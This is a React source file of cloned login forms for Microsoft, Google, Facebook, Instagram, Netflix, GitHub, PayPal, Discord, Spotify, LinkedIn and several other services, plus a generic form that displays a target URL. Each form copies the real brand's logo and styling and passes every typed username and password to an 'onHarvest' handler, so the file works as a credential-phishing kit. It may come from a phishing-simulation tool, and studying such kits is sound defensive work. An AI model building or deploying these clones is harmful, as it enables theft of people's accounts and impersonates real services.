import React from 'react';
import { Monitor } from 'lucide-react';

export const CLONE_MOCKUPS = {
    microsoft: (h) => (
        <form onSubmit={(e) => { e.preventDefault(); h.onFinish(); }} className="w-full max-w-md bg-white p-10 rounded-lg shadow-sm border border-gray-200 text-left">
            <div className="flex justify-start mb-4">
                <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft" className="h-5" />
            </div>
            <h2 className="text-2xl font-semibold text-[#1b1b1b] mb-1">Sign in</h2>
            <input type="text" placeholder="Email, phone, or Skype" onChange={(e) => h.onHarvest('user', e.target.value)} className="w-full border-b border-gray-300 py-2 focus:border-[#0067b8] outline-none mb-4 text-sm text-black" />
            <div className="flex justify-end gap-2">
                <button type="submit" className="px-10 py-1.5 bg-[#0067b8] text-white hover:bg-[#005da6] transition-colors rounded-none text-sm font-normal">Next</button>
            </div>
        </form>
    ),
    google: (h) => (
        <form onSubmit={(e) => { e.preventDefault(); h.onFinish(); }} className="w-full max-w-[450px] bg-white p-10 rounded-xl border border-gray-200 text-center">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" className="h-8 mx-auto mb-4" />
            <h2 className="text-2xl font-normal text-[#202124] mb-8">Sign in</h2>
            <input type="text" placeholder="Email or phone" onChange={(e) => h.onHarvest('user', e.target.value)} className="w-full border border-gray-300 rounded-md p-4 focus:border-blue-500 outline-none text-base text-black mb-10" />
            <div className="flex justify-end"><button type="submit" className="bg-blue-600 text-white px-6 py-2 rounded-md font-medium text-sm hover:bg-blue-700 shadow-sm">Next</button></div>
        </form>
    ),
    facebook: (h) => (
        <form onSubmit={(e) => { e.preventDefault(); h.onFinish(); }} className="w-full max-w-[400px] bg-white p-6 rounded-lg shadow-xl text-center border border-gray-100">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2e/Facebook_logo_2013-2019.png" alt="Facebook" className="h-8 mx-auto mb-6" />
            <div className="space-y-4">
                <input type="text" placeholder="Email or phone number" onChange={(e) => h.onHarvest('user', e.target.value)} className="w-full border border-gray-300 rounded-md p-3.5 focus:border-[#1877f2] outline-none text-base text-black" />
                <input type="password" placeholder="Password" onChange={(e) => h.onHarvest('pass', e.target.value)} className="w-full border border-gray-300 rounded-md p-3.5 focus:border-[#1877f2] outline-none text-base text-black" />
                <button type="submit" className="w-full bg-[#1877f2] text-white py-3 rounded-md font-bold text-xl hover:bg-[#166fe5] transition-colors">Log In</button>
            </div>
        </form>
    ),
    instagram: (h) => (
        <form onSubmit={(e) => { e.preventDefault(); h.onFinish(); }} className="w-full max-w-[350px] bg-white p-10 rounded-lg border border-gray-200 text-center shadow-sm">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Instagram_logo.svg" alt="Instagram" className="h-12 mx-auto mb-10" />
            <div className="space-y-3">
                <input type="text" placeholder="Phone number, username, or email" onChange={(e) => h.onHarvest('user', e.target.value)} className="w-full bg-[#fafafa] border border-gray-300 rounded-sm p-3 text-xs focus:border-gray-500 outline-none text-black" />
                <input type="password" placeholder="Password" onChange={(e) => h.onHarvest('pass', e.target.value)} className="w-full bg-[#fafafa] border border-gray-300 rounded-sm p-3 text-xs focus:border-gray-500 outline-none text-black" />
                <button type="submit" className="w-full bg-[#0095f6] text-white py-1.5 rounded-lg font-bold text-sm mt-2">Log In</button>
            </div>
        </form>
    ),
    netflix: (h) => (
        <form onSubmit={(e) => { e.preventDefault(); h.onFinish(); }} className="w-full max-w-[450px] bg-black p-16 rounded-lg text-left">
            <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" className="h-8 mb-8" />
            <h2 className="text-3xl font-bold text-white mb-8">Sign In</h2>
            <div className="space-y-4">
                <input type="text" placeholder="Email or phone number" onChange={(e) => h.onHarvest('user', e.target.value)} className="w-full bg-[#333] border-none rounded p-4 text-white outline-none" />
                <input type="password" placeholder="Password" onChange={(e) => h.onHarvest('pass', e.target.value)} className="w-full bg-[#333] border-none rounded p-4 text-white outline-none" />
                <button type="submit" className="w-full bg-[#e50914] text-white py-3.5 rounded font-bold text-base mt-4">Sign In</button>
            </div>
        </form>
    ),
    shahid: (h) => (
        <form onSubmit={(e) => { e.preventDefault(); h.onFinish(); }} className="w-full max-w-[450px] bg-[#0d0d0d] p-10 rounded-2xl border border-white/10 text-center">
            <img src="https://upload.wikimedia.org/wikipedia/ar/b/bb/Shahid_logo.svg" alt="Shahid" className="h-12 mx-auto mb-8" />
            <div className="space-y-4 text-left">
                <input type="text" placeholder="Enter your email" onChange={(e) => h.onHarvest('user', e.target.value)} className="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-white focus:border-[#ff9d00] outline-none" />
                <input type="password" placeholder="Enter your password" onChange={(e) => h.onHarvest('pass', e.target.value)} className="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-white focus:border-[#ff9d00] outline-none" />
                <button type="submit" className="w-full bg-gradient-to-r from-[#ff9d00] to-[#ffc400] text-black py-4 rounded-xl font-black text-lg mt-4">Login</button>
            </div>
        </form>
    ),
    discord: (h) => (
        <form onSubmit={(e) => { e.preventDefault(); h.onFinish(); }} className="w-full max-w-[480px] bg-[#313338] p-8 rounded-lg text-left shadow-2xl">
            <div className="text-center mb-8">
                <h2 className="text-2xl font-bold text-white mb-2 tracking-tight">Welcome back!</h2>
                <p className="text-[#b5bac1] text-base">We're so excited to see you again!</p>
            </div>
            <div className="space-y-5">
                <div className="space-y-2">
                    <label className="text-[10px] font-bold text-[#b5bac1] uppercase">Email or Phone Number *</label>
                    <input type="text" onChange={(e) => h.onHarvest('user', e.target.value)} className="w-full bg-[#1e1f22] border-none rounded p-3 text-white focus:outline-none" />
                </div>
                <div className="space-y-2">
                    <label className="text-[10px] font-bold text-[#b5bac1] uppercase">Password *</label>
                    <input type="password" onChange={(e) => h.onHarvest('pass', e.target.value)} className="w-full bg-[#1e1f22] border-none rounded p-3 text-white focus:outline-none" />
                </div>
                <button type="submit" className="w-full bg-[#5865f2] text-white py-3 rounded font-bold text-base hover:bg-[#4752c4] transition-colors mt-2">Log In</button>
            </div>
        </form>
    ),
    github: (h) => (
        <form onSubmit={(e) => { e.preventDefault(); h.onFinish(); }} className="w-full max-w-[340px] bg-[#0d1117] p-6 rounded-lg border border-[#30363d] text-left shadow-xl">
            <div className="flex justify-center mb-6">
                <svg viewBox="0 0 16 16" className="w-8 h-8 fill-white"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"></path></svg>
            </div>
            <div className="bg-[#161b22] border border-[#30363d] rounded-md p-5 space-y-4">
                <input type="text" placeholder="Username or email address" onChange={(e) => h.onHarvest('user', e.target.value)} className="w-full bg-[#0d1117] border border-[#30363d] rounded-md p-1.5 text-white focus:border-[#1f6feb] outline-none shadow-inner" />
                <input type="password" placeholder="Password" onChange={(e) => h.onHarvest('pass', e.target.value)} className="w-full bg-[#0d1117] border border-[#30363d] rounded-md p-1.5 text-white focus:border-[#1f6feb] outline-none shadow-inner" />
                <button type="submit" className="w-full bg-[#238636] text-white py-1.5 rounded-md font-bold text-sm hover:bg-[#2eaa42] transition-colors mt-2 shadow-sm border border-[rgba(240,246,252,0.1)]">Sign in</button>
            </div>
        </form>
    ),
    paypal: (h) => (
        <form onSubmit={(e) => { e.preventDefault(); h.onFinish(); }} className="w-full max-w-[460px] bg-white p-10 rounded-2xl shadow-sm border border-gray-100 text-center">
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal" className="h-8 mx-auto mb-10" />
            <div className="space-y-4">
                <input type="text" placeholder="Email or mobile number" onChange={(e) => h.onHarvest('user', e.target.value)} className="w-full border border-gray-300 rounded-md p-4 focus:border-blue-600 outline-none text-lg text-black" />
                <button type="submit" className="w-full bg-[#0070e0] text-white py-3.5 rounded-full font-bold text-lg hover:bg-[#005ea6] transition-colors">Next</button>
            </div>
        </form>
    ),
    watchit: (h) => (
        <form onSubmit={(e) => { e.preventDefault(); h.onFinish(); }} className="w-full max-w-[450px] bg-[#141414] p-10 rounded-3xl border border-red-500/20 text-center">
            <div className="h-12 mx-auto mb-8 flex items-center justify-center text-white text-3xl font-black italic tracking-tighter">WATCH IT</div>
            <div className="space-y-5 text-left">
                <input type="text" placeholder="Email / Phone" onChange={(e) => h.onHarvest('user', e.target.value)} className="w-full bg-white/5 border-b-2 border-white/20 p-4 text-white focus:border-red-600 outline-none" />
                <input type="password" placeholder="Password" onChange={(e) => h.onHarvest('pass', e.target.value)} className="w-full bg-white/5 border-b-2 border-white/20 p-4 text-white focus:border-red-600 outline-none" />
                <button type="submit" className="w-full bg-red-600 text-white py-4 rounded-full font-black text-base mt-2 hover:bg-red-500 uppercase">Continue</button>
            </div>
        </form>
    ),
    yangoplay: (h) => (
        <form onSubmit={(e) => { e.preventDefault(); h.onFinish(); }} className="w-full max-w-[450px] bg-[#080808] p-12 rounded-[2rem] border border-white/5 text-center">
            <div className="w-16 h-16 bg-gradient-to-tr from-[#7000ff] via-[#ff0092] to-[#ffcd00] rounded-2xl mx-auto mb-8 flex items-center justify-center text-white text-3xl font-black italic">Y</div>
            <div className="space-y-4">
                <input type="text" placeholder="Phone or Login" onChange={(e) => h.onHarvest('user', e.target.value)} className="w-full bg-[#1a1a1a] border border-white/10 rounded-2xl p-5 text-white focus:border-[#ff0092] outline-none transition-all text-center text-lg font-bold" />
                <button type="submit" className="w-full bg-white text-black py-4 rounded-2xl font-black text-lg hover:bg-gray-200">Confirm</button>
            </div>
        </form>
    ),
    x: (h) => (
        <form onSubmit={(e) => { e.preventDefault(); h.onFinish(); }} className="w-full max-w-[400px] bg-black p-10 rounded-2xl border border-white/20 text-center">
            <svg viewBox="0 0 24 24" className="h-10 w-10 mx-auto mb-10 fill-white"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></svg>
            <div className="space-y-4">
                <input type="text" placeholder="Phone, email, or username" onChange={(e) => h.onHarvest('user', e.target.value)} className="w-full bg-transparent border border-white/20 rounded p-4 text-white focus:border-blue-500 outline-none" />
                <button type="submit" className="w-full bg-white text-black py-2.5 rounded-full font-bold">Next</button>
            </div>
        </form>
    ),
    anghami: (h) => (
        <form onSubmit={(e) => { e.preventDefault(); h.onFinish(); }} className="w-full max-w-[450px] bg-[#000] p-12 rounded-3xl border border-white/10 text-center">
            <div className="w-16 h-16 bg-[#6f00ff] rounded-2xl mx-auto mb-8 flex items-center justify-center">
                <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Anghami_logo_2022.png" alt="Anghami" className="h-10" />
            </div>
            <div className="space-y-4">
                <input type="text" placeholder="Email or Phone" onChange={(e) => h.onHarvest('user', e.target.value)} className="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-white focus:border-[#6f00ff] outline-none" />
                <button type="submit" className="w-full bg-[#6f00ff] text-white py-4 rounded-xl font-bold text-lg hover:bg-[#5b00d1]">Sign in</button>
            </div>
        </form>
    ),
    deezer: (h) => (
        <form onSubmit={(e) => { e.preventDefault(); h.onFinish(); }} className="w-full max-w-[450px] bg-white p-10 rounded-lg text-center border border-gray-200 shadow-xl">
            <img src="https://cdn-static.dzcdn.net/common/images/common/logo/deezer_logo_purple.png" alt="Deezer" className="h-8 mx-auto mb-10" />
            <div className="space-y-4 text-left">
                <input type="text" placeholder="Email address" onChange={(e) => h.onHarvest('user', e.target.value)} className="w-full border border-gray-300 rounded p-3 text-black focus:border-[#ef5466] outline-none" />
                <input type="password" placeholder="Password" onChange={(e) => h.onHarvest('pass', e.target.value)} className="w-full border border-gray-300 rounded p-3 text-black focus:border-[#ef5466] outline-none" />
                <button type="submit" className="w-full bg-[#ef5466] text-white py-3 rounded font-bold text-base hover:bg-[#d84052]">Log in</button>
            </div>
        </form>
    ),
    linkedin: (h) => (
        <form onSubmit={(e) => { e.preventDefault(); h.onFinish(); }} className="w-full max-w-[400px] bg-white p-8 rounded-lg shadow-lg text-left">
            <img src="https://upload.wikimedia.org/wikipedia/commons/0/01/LinkedIn_Logo.svg" alt="LinkedIn" className="h-6 mb-6" />
            <div className="space-y-4">
                <input type="text" placeholder="Email or Phone" onChange={(e) => h.onHarvest('user', e.target.value)} className="w-full border border-gray-400 rounded-md p-3 focus:ring-1 focus:ring-blue-600 outline-none" />
                <input type="password" placeholder="Password" onChange={(e) => h.onHarvest('pass', e.target.value)} className="w-full border border-gray-400 rounded-md p-3 focus:ring-1 focus:ring-blue-600 outline-none" />
                <button type="submit" className="w-full bg-[#0073b1] text-white py-3 rounded-full font-bold text-base hover:bg-[#004182]">Sign in</button>
            </div>
        </form>
    ),
    spotify: (h) => (
        <form onSubmit={(e) => { e.preventDefault(); h.onFinish(); }} className="w-full max-w-[450px] bg-[#121212] p-12 rounded-xl text-center">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/26/Spotify_logo_with_text.svg" alt="Spotify" className="h-10 mx-auto mb-10 invert" />
            <div className="space-y-4 text-left">
                <input type="text" placeholder="Email address or username" onChange={(e) => h.onHarvest('user', e.target.value)} className="w-full bg-[#3e3e3e] border border-white/40 rounded p-3 text-white focus:border-white outline-none" />
                <input type="password" placeholder="Password" onChange={(e) => h.onHarvest('pass', e.target.value)} className="w-full bg-[#3e3e3e] border border-white/40 rounded p-3 text-white focus:border-white outline-none" />
                <button type="submit" className="w-full bg-[#1db954] text-black py-3.5 rounded-full font-bold text-base mt-2">Log In</button>
            </div>
        </form>
    ),
    generic: (h, url) => (
        <form onSubmit={(e) => { e.preventDefault(); h.onFinish(); }} className="w-full max-w-md bg-white p-10 rounded-lg shadow-sm border border-gray-200 text-left">
            <div className="bg-gray-100 w-16 h-16 rounded-lg mb-6 flex items-center justify-center text-gray-400"><Monitor size={32} /></div>
            <h2 className="text-2xl font-semibold text-gray-800 mb-2">Login Required</h2>
            <p className="text-sm text-gray-600 mb-8 font-mono text-black">Connecting to: {url}</p>
            <div className="space-y-4">
                <input type="text" placeholder="Username / Email" onChange={(e) => h.onHarvest('user', e.target.value)} className="w-full border-b border-gray-300 py-2 focus:border-blue-600 outline-none text-sm text-black" />
                <input type="password" placeholder="Password" onChange={(e) => h.onHarvest('pass', e.target.value)} className="w-full border-b border-gray-300 py-2 focus:border-blue-600 outline-none text-sm text-black" />
                <button type="submit" className="w-full bg-blue-600 text-white py-2 rounded font-medium mt-4">Continue</button>
            </div>
        </form>
    )
};
